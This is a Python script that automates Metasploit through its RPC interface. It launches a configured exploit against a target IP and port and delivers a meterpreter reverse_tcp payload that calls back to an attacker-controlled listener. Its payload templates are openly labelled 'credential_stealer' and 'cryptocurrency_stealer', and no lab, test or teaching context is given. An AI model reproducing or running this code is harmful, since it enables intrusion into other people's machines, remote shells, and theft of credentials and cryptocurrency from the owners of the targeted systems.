import logging
import yaml
from pymetasploit3.msfrpc import MsfRpcClient

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(filename)s:%(lineno)d - %(message)s')

# Load configuration
try:
    with open('config.yaml', 'r') as f:
        config = yaml.safe_load(f)
except Exception as e:
    logging.error(f"Error loading configuration: {e}")
    exit()

# Set up the Metasploit RPC client
try:
    msf_client = MsfRpcClient(config['metasploit_rpc']['host'], 
                               config['metasploit_rpc']['user'], 
                               config['metasploit_rpc']['password'])
except Exception as e:
    logging.error(f"Error connecting to Metasploit RPC: {e}")
    exit()

# Define the exploit injection function
def inject_payload_with_metasploit(exploit, payload):
    # Use the Metasploit RPC client to inject the payload
    try:
        exploit_id = msf_client.modules.exploits(exploit['exploit_name'])
        exploit_instance = msf_client.modules.use('exploit', exploit_id)
        exploit_instance['RHOST'] = exploit['target_ip']
        exploit_instance['RPORT'] = exploit['target_port']
        exploit_instance['PAYLOAD'] = payload['payload_name']
        exploit_instance['LHOST'] = config['metasploit_rpc']['lhost']
        exploit_instance['LPORT'] = config['metasploit_rpc']['lport']
        msf_client.consoles.console().run_module(exploit_instance)
        logging.info(f"Successfully injected payload {payload['payload_name']} into {exploit['target_ip']}:{exploit['target_port']}")
    except Exception as e:
        logging.error(f"Error injecting payload: {e}")

# Define the payload templates
payload_templates = {
    'credential_stealer': {
        'payload_name': 'windows/meterpreter/reverse_tcp',
        'payload_options': {
            'LHOST': 'localhost',
            'LPORT': 4444
        }
    },
    'cryptocurrency_stealer': {
        'payload_name': 'windows/meterpreter/reverse_tcp',
        'payload_options': {
            'LHOST': 'localhost',
            'LPORT': 4444
        }
    }
}
